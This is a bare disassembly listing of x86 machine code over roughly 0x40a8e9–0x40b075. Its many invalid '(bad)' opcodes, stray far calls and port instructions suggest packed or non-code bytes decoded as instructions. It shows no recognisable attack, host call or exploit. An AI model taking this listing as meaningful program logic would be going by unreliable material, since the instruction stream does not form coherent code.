  40a8e9:	repnz retf 0xe3a9
  40a8ed:	fld    DWORD PTR ds:0x41cd8b9c
  40a8f3:	mov    al,0xc9
  40a8f5:	aaa    
  40a8f6:	cdq    
  40a8f7:	(bad)  
  40a8f8:	sahf   
  40a8f9:	stos   BYTE PTR es:[edi],al
  40a8fa:	xchg   edi,eax
  40a8fb:	rol    DWORD PTR [edx-0x16],0x53
  40a8ff:	bound  eax,QWORD PTR [esi+0x4a]
  40a902:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a903:	adc    dh,dh
  40a905:	xchg   ecx,eax
  40a906:	out    0xfb,al
  40a908:	inc    BYTE PTR [ecx-0x26]
  40a90b:	mov    esp,0xee8d8d78
  40a910:	dec    edx
  40a911:	add    edx,DWORD PTR [ebx]
  40a913:	adc    ch,0x33
  40a916:	mov    dh,0xf0
  40a918:	or     eax,DWORD PTR [edx-0x80]
  40a91b:	fdiv   QWORD PTR [eax]
  40a91d:	test   DWORD PTR [ebp+0x7a],ebp
  40a920:	xor    DWORD PTR [ebx],0x10
  40a923:	cs jne 0x40a8b1
  40a926:	jns    0x40a951
  40a928:	lods   al,BYTE PTR ds:[esi]
  40a929:	pop    esp
  40a92a:	sbb    DWORD PTR [ebx],esi
  40a92c:	add    DWORD PTR ds:0xc755a778,edx
  40a932:	pop    esp
  40a933:	aas    
  40a934:	push   0xffffffed
  40a936:	mov    esi,0xa9944b6e
  40a93b:	mov    ch,0x88
  40a93d:	mov    ebx,0x10deab1
  40a942:	sahf   
  40a943:	mov    ebp,0xee5efdf3
  40a948:	cdq    
  40a949:	and    al,0xb9
  40a94b:	add    DWORD PTR [eax],0x6710db0a
  40a951:	stos   BYTE PTR es:[edi],al
  40a952:	call   0x6608:0xef3e18da
  40a959:	loope  0x40a906
  40a95b:	xor    eax,0xc31935bc
  40a960:	sbb    DWORD PTR [ecx-0x72444fa2],ecx
  40a966:	pusha  
  40a967:	cmp    DWORD PTR [eax],esi
  40a969:	pop    edi
  40a96a:	in     eax,0x9b
  40a96c:	int    0x2e
  40a96e:	pop    ds
  40a96f:	js     0x40a9cf
  40a971:	call   0x98c8:0xa972e516
  40a978:	jmp    FWORD PTR [ebx+0x20]
  40a97b:	imul   esp,DWORD PTR [ebx-0x5df83390],0x71
  40a982:	div    esp
  40a984:	mov    DWORD PTR [edx],ebp
  40a986:	loop   0x40a917
  40a988:	pop    esp
  40a989:	add    al,0x49
  40a98b:	push   es
  40a98c:	test   dh,al
  40a98e:	fs push eax
  40a990:	dec    ebp
  40a991:	js     0x40a982
  40a993:	ja     0x40a997
  40a995:	xor    esp,DWORD PTR [ebp+edi*1-0x42]
  40a999:	out    dx,al
  40a99a:	imul   eax,DWORD PTR [edx+0x7dd54b34],0xc1e8b369
  40a9a4:	sub    al,0xfa
  40a9a6:	test   eax,0x93c947e6
  40a9ab:	pop    ebx
  40a9ac:	fnsave [esi]
  40a9ae:	not    BYTE PTR [ebx+0x457a4d2c]
  40a9b4:	cmc    
  40a9b5:	repnz mov edx,0x6482a5fa
  40a9bb:	dec    edi
  40a9bc:	inc    ebx
  40a9bd:	ret    
  40a9be:	pop    eax
  40a9bf:	adc    eax,DWORD PTR [edi+edx*1+0x51]
  40a9c3:	push   ecx
  40a9c4:	mov    esi,ecx
  40a9c6:	mov    ds:0x484584c2,al
  40a9cb:	scas   eax,DWORD PTR es:[edi]
  40a9cc:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  40a9ce:	ret    
  40a9cf:	sbb    DWORD PTR [edi+0x5ac58b20],0xf7a78cbc
  40a9d9:	call   0x4227:0x936092f5
  40a9e0:	fstp   st(2)
  40a9e2:	(bad)  
  40a9e3:	pop    ebx
  40a9e4:	inc    edx
  40a9e5:	pushf  
  40a9e6:	mov    gs,WORD PTR [ebp+0x5e]
  40a9e9:	sbb    edi,DWORD PTR [ebp-0x302871f0]
  40a9ef:	pop    ebp
  40a9f0:	cwde   
  40a9f1:	jbe    0x40a975
  40a9f3:	push   edx
  40a9f4:	nop
  40a9f5:	fld    QWORD PTR [eax]
  40a9f7:	test   ch,bh
  40a9f9:	fiadd  DWORD PTR [edi+0x47eb3200]
  40a9ff:	mov    eax,ds:0x380cc0b2
  40aa04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa05:	and    dh,dl
  40aa07:	cmp    bh,BYTE PTR [edx]
  40aa09:	xlat   BYTE PTR ds:[ebx]
  40aa0a:	in     al,0xca
  40aa0c:	pushf  
  40aa0d:	jp     0x40aa00
  40aa0f:	or     al,0x8e
  40aa11:	(bad)  
  40aa12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa13:	pop    edx
  40aa14:	(bad)  
  40aa15:	jmp    0x40aa77
  40aa17:	sub    al,0x33
  40aa19:	mov    BYTE PTR [ecx-0x5a],0x41
  40aa1d:	aaa    
  40aa1e:	ja     0x40a9fb
  40aa20:	xchg   ebx,eax
  40aa21:	dec    esi
  40aa22:	xchg   ebx,eax
  40aa23:	add    al,0xc
  40aa25:	sub    edx,DWORD PTR [edi+0x7881f9b0]
  40aa2b:	mov    edx,0x5a689722
  40aa30:	sbb    eax,0x56c089d5
  40aa35:	sbb    eax,0x727f9147
  40aa3a:	test   eax,0x559865ef
  40aa3f:	adc    BYTE PTR [edx+0x10],dl
  40aa42:	sub    al,0x7e
  40aa44:	lds    edi,FWORD PTR [edi-0x2264bd0e]
  40aa4a:	inc    esi
  40aa4b:	cwde   
  40aa4c:	push   ebp
  40aa4d:	pop    ebx
  40aa4e:	mov    ecx,0x7efed2a3
  40aa53:	push   esi
  40aa54:	outs   dx,BYTE PTR ds:[esi]
  40aa55:	imul   esp,DWORD PTR [edx+0x774f2adf],0xffffffc1
  40aa5c:	adc    bh,ch
  40aa5e:	mov    dl,0x14
  40aa60:	mov    edi,0x90b764b3
  40aa65:	(bad)  
  40aa66:	jo     0x40aa42
  40aa68:	sub    al,0x94
  40aa6a:	xchg   edx,eax
  40aa6b:	test   bl,al
  40aa6d:	addr16 pop ebp
  40aa6f:	cmp    al,0x27
  40aa71:	loop   0x40aa61
  40aa73:	adc    dh,dl
  40aa75:	and    al,BYTE PTR ds:0x20b02e1e
  40aa7b:	mov    bh,0x12
  40aa7d:	in     al,dx
  40aa7e:	and    DWORD PTR [edi-0x2645b479],0xffffffd4
  40aa85:	call   0x92ac:0xeb431773
  40aa8c:	cmp    ecx,esi
  40aa8e:	pop    ss
  40aa8f:	mov    edx,0x9d6bc4bf
  40aa94:	push   0xffffff81
  40aa96:	sbb    DWORD PTR [eax],ecx
  40aa98:	std    
  40aa99:	mov    ch,0x49
  40aa9b:	dec    ecx
  40aa9c:	jge    0x40aa85
  40aa9e:	jecxz  0x40aa95
  40aaa0:	mov    ebp,0x1006ffb3
  40aaa5:	pop    ebx
  40aaa6:	add    DWORD PTR [eax-0x71],edx
  40aaa9:	cmc    
  40aaaa:	xor    BYTE PTR [eax+0x20],0x8f
  40aaae:	stc    
  40aaaf:	xor    ch,dl
  40aab1:	mov    ebp,esp
  40aab3:	icebp  
  40aab4:	dec    ecx
  40aab5:	push   ecx
  40aab6:	call   DWORD PTR ds:0xfee2ffa6
  40aabc:	mov    si,0x5f37
  40aac0:	or     al,BYTE PTR [esi+0x19c7e76b]
  40aac6:	add    edx,ecx
  40aac8:	enter  0xc889,0xd0
  40aacc:	jae    0x40ab15
  40aace:	outs   dx,DWORD PTR ds:[esi]
  40aacf:	mov    esi,ebx
  40aad1:	and    eax,0xfc30cd70
  40aad6:	rcl    DWORD PTR [ebx],0xc5
  40aad9:	jl     0x40ab4c
  40aadb:	aas    
  40aadc:	mov    ebx,0xd3ae4058
  40aae1:	fs repnz cs pop ebp
  40aae5:	test   BYTE PTR [esp+eiz*2+0x44],0xd1
  40aaea:	fistp  DWORD PTR [edx+0x35]
  40aaed:	mov    dl,0xe2
  40aaef:	push   esi
  40aaf0:	jle    0x40aad4
  40aaf2:	inc    ecx
  40aaf3:	imul   ebx,DWORD PTR [eax-0x7b],0xffffffb4
  40aaf7:	mov    eax,ds:0xfb13cd51
  40aafc:	jmp    0x1334c638
  40ab01:	ds mov ah,0x89
  40ab04:	rol    DWORD PTR [ebx+eiz*8-0xe],cl
  40ab08:	xchg   esp,eax
  40ab09:	dec    ebx
  40ab0a:	mov    WORD PTR [ebp+0x45],fs
  40ab0d:	inc    edi
  40ab0e:	sbb    BYTE PTR [ecx-0x34],dl
  40ab11:	out    dx,al
  40ab12:	pop    esi
  40ab13:	add    edi,DWORD PTR [eax]
  40ab15:	ret    
  40ab16:	xchg   ecx,eax
  40ab17:	mov    eax,0x7d3a2e75
  40ab1c:	jnp    0x40aaca
  40ab1e:	adc    BYTE PTR [eax],al
  40ab20:	out    dx,eax
  40ab21:	in     eax,0xf3
  40ab23:	aas    
  40ab24:	test   BYTE PTR ds:0x5ddb278e,cl
  40ab2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab2b:	push   edx
  40ab2c:	ds test al,dl
  40ab2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab30:	jae    0x40aaf8
  40ab32:	popf   
  40ab33:	inc    esi
  40ab34:	pop    es
  40ab35:	(bad)  
  40ab36:	mov    cl,0x29
  40ab38:	mov    edx,ecx
  40ab3a:	sbb    bl,0xca
  40ab3d:	adc    BYTE PTR [ebx+0x59da0cd3],0x62
  40ab44:	cli    
  40ab45:	push   ecx
  40ab46:	cmp    al,0x60
  40ab48:	pop    ds
  40ab49:	xchg   ebx,eax
  40ab4a:	jnp    0x40abb5
  40ab4c:	int3   
  40ab4d:	out    dx,al
  40ab4e:	pop    eax
  40ab4f:	popa   
  40ab50:	add    al,0x39
  40ab52:	dec    esp
  40ab53:	inc    esi
  40ab54:	ret    
  40ab55:	mov    DWORD PTR [esi-0x650d60ca],esp
  40ab5b:	xor    ecx,DWORD PTR [ecx-0x6f]
  40ab5e:	fisub  WORD PTR [ebx]
  40ab60:	rcl    ebp,cl
  40ab62:	addr16 xchg edi,eax
  40ab64:	jmp    0x16dd1184
  40ab69:	loope  0x40ab65
  40ab6b:	inc    eax
  40ab6c:	in     eax,0x16
  40ab6e:	xchg   BYTE PTR [edx+0x2b1c5dd1],al
  40ab74:	push   0xc39193f6
  40ab79:	cmp    ebx,DWORD PTR [esi+eax*4]
  40ab7c:	leave  
  40ab7d:	inc    ebp
  40ab7e:	cmp    al,0x1f
  40ab80:	retf   
  40ab81:	xchg   ebx,eax
  40ab82:	mov    bh,0x14
  40ab84:	mov    ds:0xb4e2f13a,eax
  40ab89:	jmp    0x9342b44c
  40ab8e:	xchg   ebp,eax
  40ab8f:	test   eax,0xd2710516
  40ab94:	jns    0x40ab51
  40ab96:	out    0x63,al
  40ab98:	pop    es
  40ab99:	stos   DWORD PTR es:[edi],eax
  40ab9a:	inc    esi
  40ab9b:	call   0xf21bb177
  40aba0:	repz out dx,eax
  40aba2:	inc    esp
  40aba3:	xchg   ecx,eax
  40aba4:	daa    
  40aba5:	mov    dl,0x7c
  40aba7:	test   al,cl
  40aba9:	inc    esi
  40abaa:	std    
  40abab:	inc    esp
  40abac:	sahf   
  40abad:	enter  0x1183,0x24
  40abb1:	or     al,0xe8
  40abb3:	in     al,dx
  40abb4:	imul   ch
  40abb6:	jns    0x40abe1
  40abb8:	mov    ds:0xaa8efd53,eax
  40abbd:	retf   
  40abbe:	push   0xffffff99
  40abc0:	inc    esp
  40abc1:	cmp    al,0x68
  40abc3:	sbb    DWORD PTR [ecx+eax*8-0x134dc436],0x249abfc3
  40abce:	stos   BYTE PTR es:[edi],al
  40abcf:	inc    ebx
  40abd0:	imul   edx,DWORD PTR [ebp-0x5a7dbcfb],0xb0271aed
  40abda:	aam    0x31
  40abdc:	das    
  40abdd:	pop    ss
  40abde:	std    
  40abdf:	xchg   DWORD PTR [ebp+0x3d656e1c],esi
  40abe5:	inc    edx
  40abe6:	fsubrp st(4),st
  40abe8:	or     eax,0xb7957a74
  40abed:	mov    eax,ds:0xfc89e011
  40abf2:	mov    ebp,0x476cbdf4
  40abf7:	sbb    edx,edi
  40abf9:	or     al,0xf3
  40abfb:	inc    esi
  40abfc:	ret    0xe8f6
  40abff:	add    BYTE PTR [ebx-0x4c],0x78
  40ac03:	mov    ebx,0x96023bc0
  40ac08:	xchg   DWORD PTR [ecx+esi*4-0x4],esp
  40ac0c:	rol    DWORD PTR [edx-0x1d],cl
  40ac0f:	xchg   edi,eax
  40ac10:	jnp    0x40ac1a
  40ac12:	cs scas al,BYTE PTR es:[edi]
  40ac14:	das    
  40ac15:	fsubr  st,st(0)
  40ac17:	shl    DWORD PTR [eax],1
  40ac19:	pop    ecx
  40ac1a:	fwait
  40ac1b:	shl    DWORD PTR [eax],1
  40ac1d:	and    eax,0x89351de9
  40ac22:	xchg   ebx,eax
  40ac23:	mov    ebx,eax
  40ac25:	(bad)  [ebx+0x481759b5]
  40ac2b:	fsubr  QWORD PTR [ecx-0x3d]
  40ac2e:	mov    eax,0x697d3f97
  40ac33:	aam    0xf2
  40ac35:	and    eax,0x5eba2f01
  40ac3a:	outs   dx,DWORD PTR ds:[esi]
  40ac3b:	mov    bh,BYTE PTR [esi-0x40ab0e01]
  40ac41:	pop    esp
  40ac42:	scas   eax,DWORD PTR es:[edi]
  40ac43:	mov    ebp,0x11e11736
  40ac48:	cs cdq 
  40ac4a:	inc    ebx
  40ac4b:	cmp    dl,BYTE PTR [ecx]
  40ac4d:	lds    ebx,FWORD PTR [edx+0x5e10a901]
  40ac53:	daa    
  40ac54:	ficom  DWORD PTR [esi-0x11]
  40ac57:	lahf   
  40ac58:	pop    ecx
  40ac59:	cmp    ebx,DWORD PTR [edx+0x66]
  40ac5c:	cs cmp eax,0x8f96b6b2
  40ac62:	fistp  WORD PTR [esi+eax*8+0x16df9e4c]
  40ac69:	rol    eax,1
  40ac6b:	lods   eax,DWORD PTR ds:[esi]
  40ac6c:	loope  0x40ac6e
  40ac6e:	pop    esi
  40ac6f:	inc    esi
  40ac70:	inc    ah
  40ac72:	neg    DWORD PTR [ebx-0x79]
  40ac75:	jbe    0x40ac9b
  40ac77:	or     cl,BYTE PTR [edx+0x1132aea2]
  40ac7d:	xor    ebp,DWORD PTR [ebp+0x49ac434]
  40ac83:	loop   0x40ac47
  40ac85:	ins    BYTE PTR es:[edi],dx
  40ac86:	jl     0x40ac86
  40ac88:	aaa    
  40ac89:	not    BYTE PTR [edi+eax*8-0x1499dd96]
  40ac90:	xor    al,0xdb
  40ac93:	push   es
  40ac94:	dec    esi
  40ac95:	xchg   edx,eax
  40ac96:	sbb    eax,0x2f53dded
  40ac9b:	xor    al,0x89
  40ac9d:	sbb    al,0xc3
  40ac9f:	xor    DWORD PTR [eax-0x2],edi
  40aca2:	(bad)  [di]
  40aca5:	out    0x46,eax
  40aca7:	outs   dx,DWORD PTR ds:[esi]
  40aca8:	cmp    BYTE PTR [edx],al
  40acaa:	arpl   WORD PTR [edi-0x6d8eba1],dx
  40acb0:	pop    edx
  40acb1:	call   DWORD PTR [eax]
  40acb3:	push   ds
  40acb4:	(bad)  
  40acb6:	inc    BYTE PTR [edi-0x24779a4]
  40acbc:	push   edx
  40acbd:	xor    al,0xcd
  40acbf:	mov    dl,0x23
  40acc1:	add    eax,0x496d06b8
  40acc6:	sub    al,0x0
  40acc8:	jge    0x40ad25
  40acca:	jno    0x40ad14
  40accc:	lods   al,BYTE PTR ds:[esi]
  40accd:	xlat   BYTE PTR ds:[ebx]
  40acce:	jmp    0x40acd2
  40acd0:	pusha  
  40acd1:	outs   dx,BYTE PTR ds:[esi]
  40acd2:	pop    edx
  40acd3:	ror    DWORD PTR [esi-0xe],1
  40acd6:	inc    ecx
  40acd7:	and    al,0x59
  40acd9:	daa    
  40acda:	ins    BYTE PTR es:[edi],dx
  40acdb:	xchg   edx,eax
  40acdc:	mov    edi,0x85e2e667
  40ace1:	jns    0x40ad08
  40ace3:	aad    0xc6
  40ace5:	inc    esi
  40ace6:	pushf  
  40ace7:	div    DWORD PTR [ebp+0x36]
  40acea:	jmp    0xe95a:0x765712fe
  40acf1:	sub    cl,al
  40acf3:	mov    ds:0x5e913c89,eax
  40acf8:	pop    edx
  40acf9:	add    eax,0x5ec779be
  40acfe:	push   eax
  40acff:	pop    esi
  40ad00:	popa   
  40ad01:	mov    esi,ds
  40ad03:	xor    edx,edi
  40ad05:	sub    ch,cl
  40ad07:	maxps  xmm2,xmm1
  40ad0a:	mov    ecx,0x255401f3
  40ad0f:	add    eax,0xdce6ef62
  40ad14:	mov    ch,0xe5
  40ad16:	mov    eax,0x9582f3ca
  40ad1b:	std    
  40ad1c:	dec    esi
  40ad1d:	sbb    eax,0xdf580ee
  40ad22:	fs mov ebp,0xeeea9379
  40ad28:	pop    ebp
  40ad29:	jo     0x40acbe
  40ad2b:	push   es
  40ad2c:	popa   
  40ad2d:	(bad)  
  40ad2e:	lahf   
  40ad2f:	(bad)  
  40ad30:	(bad)  
  40ad31:	shl    bl,0xe6
  40ad34:	cmp    dl,bh
  40ad36:	cmp    eax,0xb3221730
  40ad3b:	inc    eax
  40ad3c:	test   al,0xfc
  40ad3e:	push   edx
  40ad3f:	mov    DWORD PTR ds:0xf2c75f5a,edi
  40ad45:	(bad)  
  40ad46:	hlt    
  40ad47:	dec    eax
  40ad48:	pop    edi
  40ad49:	xchg   esi,eax
  40ad4a:	out    0xfa,al
  40ad4c:	xchg   edx,eax
  40ad4d:	test   eax,0x4be37c8f
  40ad52:	fs ja  0x40ada1
  40ad55:	test   DWORD PTR [eax],edi
  40ad57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad58:	jg     0x40adba
  40ad5a:	jae    0x40ad29
  40ad5c:	fidiv  WORD PTR [esi]
  40ad5e:	and    eax,0x813c5ded
  40ad63:	add    al,0xe1
  40ad65:	adc    eax,DWORD PTR [edx-0x5a8b8d33]
  40ad6b:	jno    0x40adc3
  40ad6d:	lahf   
  40ad6e:	dec    edi
  40ad6f:	mov    bl,BYTE PTR [ecx]
  40ad71:	outs   dx,BYTE PTR ds:[esi]
  40ad72:	mov    eax,0x7d7d50c0
  40ad77:	test   DWORD PTR [esi],edi
  40ad79:	in     eax,0x4c
  40ad7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad7c:	mov    ebx,0x3ae3e293
  40ad81:	and    al,0xbe
  40ad83:	jmp    0x2f4580ff
  40ad88:	enter  0xb7d,0x9d
  40ad8c:	fdiv   QWORD PTR [ebx+0x51]
  40ad8f:	test   eax,0xae2a2abc
  40ad94:	call   0xc464:0x28b5c3e6
  40ad9b:	pop    esp
  40ad9c:	push   ebx
  40ad9d:	xchg   DWORD PTR [ecx],eax
  40ad9f:	cmp    DWORD PTR [esi],ecx
  40ada1:	(bad)  
  40ada2:	fmul   DWORD PTR [edi-0x2f]
  40ada5:	call   0xd4ee3b0b
  40adaa:	fidiv  DWORD PTR [eax-0x3e61600e]
  40adb0:	loope  0x40adce
  40adb2:	ja     0x40ae31
  40adb4:	fcom   QWORD PTR [edi-0x7837f7f6]
  40adba:	or     al,0xef
  40adbc:	adc    al,0x5d
  40adbe:	mov    dl,0xed
  40adc0:	(bad)  
  40adc1:	mov    esp,0x85469d0f
  40adc6:	idiv   BYTE PTR [edi]
  40adc8:	xor    al,0x59
  40adca:	jne    0x40ae4b
  40adcc:	push   ebx
  40adcd:	or     eax,0x7fbad5ab
  40add3:	repz push edi
  40add5:	pop    ebp
  40add6:	push   esi
  40add7:	mov    al,ds:0xbccafc5b
  40addc:	pop    esi
  40addd:	pop    es
  40adde:	push   ds
  40addf:	xchg   esi,eax
  40ade0:	call   0xf442622e
  40ade5:	sbb    BYTE PTR [esi+0x69373a2e],0x63
  40adec:	jb     0x40adee
  40adee:	popa   
  40adef:	xchg   ecx,eax
  40adf0:	retf   0x66ea
  40adf3:	retf   
  40adf4:	mov    esi,0x3be0ba1b
  40adf9:	scas   eax,DWORD PTR es:[edi]
  40adfa:	adc    DWORD PTR [edi+0x452460fa],0xffffff8a
  40ae01:	pop    esp
  40ae02:	mov    ah,dl
  40ae04:	pop    ds
  40ae05:	sub    dh,BYTE PTR [esi+0x51]
  40ae08:	xor    ebp,ebp
  40ae0a:	bound  esi,QWORD PTR [ebx-0x79]
  40ae0d:	pop    ss
  40ae0e:	(bad)  
  40ae10:	ror    DWORD PTR [edi+0x33f66f16],cl
  40ae16:	jecxz  0x40ae36
  40ae18:	push   0x51
  40ae1a:	das    
  40ae1b:	inc    edi
  40ae1c:	sbb    BYTE PTR [edi-0x59],dl
  40ae1f:	in     al,0x9c
  40ae21:	and    cl,BYTE PTR [edi-0x10cf95b1]
  40ae27:	repz (bad) 
  40ae2a:	daa    
  40ae2b:	scas   eax,DWORD PTR es:[edi]
  40ae2c:	xchg   ecx,eax
  40ae2d:	fnstenv [eax]
  40ae2f:	jbe    0x40ae7f
  40ae31:	lea    ebx,[esi]
  40ae33:	fld    DWORD PTR [esi+0x7f29b812]
  40ae39:	ret    
  40ae3a:	cmp    esp,esp
  40ae3c:	jbe    0x40ae4e
  40ae3e:	scas   al,BYTE PTR es:[edi]
  40ae3f:	push   cs
  40ae40:	push   0x6ccf5934
  40ae45:	or     eax,0xbd4b9ad6
  40ae4a:	adc    BYTE PTR [ecx-0x240b3e26],al
  40ae50:	daa    
  40ae51:	mov    bh,0xe4
  40ae53:	xchg   edi,eax
  40ae54:	jge    0x40ae84
  40ae56:	mov    esi,0x7e92f806
  40ae5b:	dec    ebp
  40ae5c:	jnp    0x40ae94
  40ae5e:	mov    esp,0x49df9a35
  40ae63:	sub    ch,dl
  40ae65:	lahf   
  40ae66:	or     BYTE PTR [eax],0x88
  40ae69:	mov    bh,0xaf
  40ae6b:	sbb    cl,0x4e
  40ae6e:	sbb    esi,ebp
  40ae70:	pop    ebx
  40ae71:	jb     0x40aec0
  40ae73:	int    0xaa
  40ae75:	and    edx,DWORD PTR [edi-0x4949942a]
  40ae7b:	mov    cl,0x4d
  40ae7d:	cwde   
  40ae7e:	addr16 jnp 0x40aef3
  40ae81:	js     0x40ae7a
  40ae83:	inc    ebx
  40ae84:	add    DWORD PTR [eax],esi
  40ae86:	aam    0x97
  40ae88:	dec    esp
  40ae89:	adc    eax,DWORD PTR [ebx]
  40ae8b:	cmp    BYTE PTR [ecx],0xa2
  40ae8e:	mov    bl,cl
  40ae90:	mov    edi,ebx
  40ae92:	mov    ?,WORD PTR [eax-0x3d762078]
  40ae98:	outs   dx,DWORD PTR ds:[esi]
  40ae99:	or     eax,0x7db8fb87
  40ae9e:	pop    ecx
  40ae9f:	jo     0x40aeb3
  40aea1:	mov    bh,0xf8
  40aea3:	xchg   edi,eax
  40aea4:	jle    0x40af25
  40aea6:	mov    esi,0xdeac0533
  40aeab:	int    0xf7
  40aead:	(bad)  
  40aeae:	dec    esi
  40aeaf:	and    eax,0xfa3383af
  40aeb4:	xchg   esi,eax
  40aeb5:	sub    ebx,DWORD PTR [ebp-0x23]
  40aeb8:	je     0x40aec0
  40aeba:	scas   al,BYTE PTR es:[edi]
  40aebb:	or     DWORD PTR [ecx+0x35],edx
  40aebe:	dec    ecx
  40aebf:	mov    edx,0x1a73bae6
  40aec4:	jp     0x40ae6e
  40aec6:	pop    edi
  40aec7:	mov    DWORD PTR [edi],edx
  40aec9:	ins    DWORD PTR es:[edi],dx
  40aeca:	fmul   QWORD PTR [esi+0x4606ed4e]
  40aed0:	push   esp
  40aed1:	call   0x11fe595d
  40aed6:	sub    DWORD PTR [esi-0x2a050047],eax
  40aedc:	cmp    DWORD PTR [edx],eax
  40aede:	mov    bl,0x6c
  40aee0:	out    dx,eax
  40aee1:	sub    eax,0x14f7d67
  40aee6:	test   DWORD PTR [ebx],ebx
  40aee8:	pop    ds
  40aee9:	jo     0x40ae7e
  40aeeb:	fnstcw WORD PTR [edx]
  40aeed:	jae    0x40af25
  40aeef:	or     eax,0x8d9a4165
  40aef4:	in     eax,dx
  40aef5:	jno    0x40af61
  40aef7:	add    eax,DWORD PTR [edx]
  40aef9:	adc    ebx,DWORD PTR [edi]
  40aefb:	cmp    esi,DWORD PTR [esi-0x78]
  40aefe:	rcl    edx,cl
  40af00:	dec    eax
  40af01:	rcl    DWORD PTR [edx-0x10],cl
  40af04:	xchg   ebx,eax
  40af05:	scas   al,BYTE PTR es:[edi]
  40af06:	pop    ecx
  40af07:	rcl    DWORD PTR [ebp-0x96b8656],1
  40af0d:	mov    bl,0x2a
  40af0f:	and    BYTE PTR [esi-0x10],cl
  40af12:	xchg   esp,eax
  40af13:	jbe    0x2a133c53
  40af19:	xor    al,0xd2
  40af1b:	cs add al,0xf5
  40af1e:	imul   esp,DWORD PTR [esi-0x72],0xe4550c5e
  40af25:	pop    eax
  40af26:	(bad)  
  40af27:	mov    edi,0x6b4e28ff
  40af2c:	sahf   
  40af2d:	fwait
  40af2e:	(bad)  
  40af2f:	sbb    eax,esi
  40af31:	aas    
  40af32:	ins    BYTE PTR es:[edi],dx
  40af33:	cli    
  40af34:	mov    esp,0xcb718f18
  40af39:	mov    ?,WORD PTR [edi+0x2a]
  40af3c:	stos   DWORD PTR es:[edi],eax
  40af3d:	cld    
  40af3e:	add    DWORD PTR [eax],edx
  40af40:	sti    
  40af41:	nop
  40af42:	mov    al,0x44
  40af44:	xchg   BYTE PTR [edi+0x72e1cae6],cl
  40af4a:	xchg   esi,eax
  40af4b:	std    
  40af4c:	add    esi,eax
  40af4e:	mov    DWORD PTR cs:[esi+0x382c7df],edx
  40af55:	add    eax,0xa4425b68
  40af5a:	pop    edi
  40af5b:	add    al,BYTE PTR [edx]
  40af5d:	xor    esi,DWORD PTR [ebp-0x4ad31766]
  40af63:	test   DWORD PTR [edi],esp
  40af65:	add    eax,0xa6b73101
  40af6a:	lods   eax,DWORD PTR ds:[esi]
  40af6b:	xchg   edi,eax
  40af6c:	jl     0x40afaa
  40af6e:	imul   ecx,esi,0xffffffa9
  40af71:	mov    esp,0xbaf883b6
  40af76:	push   ebx
  40af77:	sub    BYTE PTR [ecx-0x40],cl
  40af7a:	call   0x3c68cca7
  40af7f:	cld    
  40af80:	inc    edi
  40af81:	push   ecx
  40af82:	in     eax,dx
  40af83:	push   esi
  40af84:	ror    DWORD PTR [eax],0xc5
  40af87:	mov    ebx,es
  40af89:	test   BYTE PTR [ecx-0x7b],ch
  40af8c:	lds    ebx,FWORD PTR [ebx+edi*1+0x5e556ba2]
  40af93:	jl     0x40af52
  40af95:	sbb    DWORD PTR [edx-0x9153b1f],esi
  40af9b:	repz fild WORD PTR [ecx-0x1fd4394]
  40afa2:	mov    eax,ds:0x9656a4d8
  40afa7:	sbb    ch,ch
  40afa9:	jb     0x40b003
  40afab:	inc    edi
  40afac:	or     bl,BYTE PTR [ecx]
  40afae:	or     al,0xbe
  40afb0:	pop    esp
  40afb1:	sbb    bh,BYTE PTR [ebx]
  40afb3:	push   ds
  40afb4:	inc    edi
  40afb5:	adc    ah,BYTE PTR [ebx-0x17e2503c]
  40afbb:	mov    dl,0xe2
  40afbd:	imul   ebx,eax,0xffffff8d
  40afc0:	xchg   BYTE PTR [edi-0x20],bh
  40afc3:	fucomip st,st(3)
  40afc5:	ror    ebx,1
  40afc7:	data16 jae 0x40af99
  40afca:	and    DWORD PTR [esi],ebp
  40afcc:	push   cs
  40afcd:	stos   BYTE PTR es:[edi],al
  40afce:	jb     0x40b017
  40afd0:	pop    ebp
  40afd1:	jnp    0x40b007
  40afd3:	jmp    0x40b019
  40afd5:	pop    ebx
  40afd6:	iret   
  40afd7:	cmc    
  40afd8:	(bad)  
  40afd9:	in     eax,0x96
  40afdb:	mov    al,0xcf
  40afdd:	ret    0x20f
  40afe0:	fild   QWORD PTR [ecx+0x69e83844]
  40afe6:	and    ebp,esi
  40afe8:	sub    esp,esp
  40afea:	mov    ebx,0x5cdc79ef
  40afef:	outs   dx,BYTE PTR ds:[esi]
  40aff0:	sahf   
  40aff1:	jge    0x40af87
  40aff3:	push   edx
  40aff4:	dec    ecx
  40aff5:	mov    esp,0x3594d38
  40affa:	adc    dl,0xcd
  40affd:	lds    esi,FWORD PTR [esi-0x5acb230a]
  40b003:	cmp    DWORD PTR [ebx-0x29006a16],ecx
  40b009:	mov    ds:0xbe6094d4,al
  40b00e:	and    BYTE PTR [edi+0x1e],bh
  40b011:	or     eax,0x7614c094
  40b016:	fsubp  st(2),st
  40b018:	cmc    
  40b019:	clc    
  40b01a:	outs   dx,BYTE PTR ds:[esi]
  40b01b:	xchg   edi,eax
  40b01c:	mov    ds:0xc665e455,al
  40b021:	inc    ebx
  40b022:	mov    esi,0x91e7f5db
  40b027:	jecxz  0x40b06a
  40b029:	sub    dl,BYTE PTR [eax+0x7e462041]
  40b02f:	add    BYTE PTR [ebx],ch
  40b031:	jecxz  0x40afe1
  40b033:	repnz iret 
  40b035:	sub    ecx,DWORD PTR [ebx+eax*8-0x26c15017]
  40b03c:	add    esp,ebp
  40b03e:	shl    BYTE PTR [ebx],cl
  40b040:	int    0x26
  40b042:	fadd   QWORD PTR [ecx]
  40b044:	push   ds
  40b045:	mov    BYTE PTR [esi-0x6f825627],ch
  40b04b:	repz mov ecx,0xb9061c62
  40b051:	sbb    al,0xab
  40b053:	and    BYTE PTR [ecx],ch
  40b055:	or     eax,0x1d374383
  40b05a:	inc    esi
  40b05b:	and    al,0x96
  40b05d:	imul   edx,DWORD PTR [esi-0x96c3450],0x1281b502
  40b067:	sar    DWORD PTR [eax+0x44],0xde
  40b06b:	loope  0x40b08f
  40b06d:	or     DWORD PTR [eax+0x40],ecx
  40b070:	pusha  
  40b071:	into   
  40b072:	test   al,0xa
  40b074:	pop    ss
  40b075:	push   edx
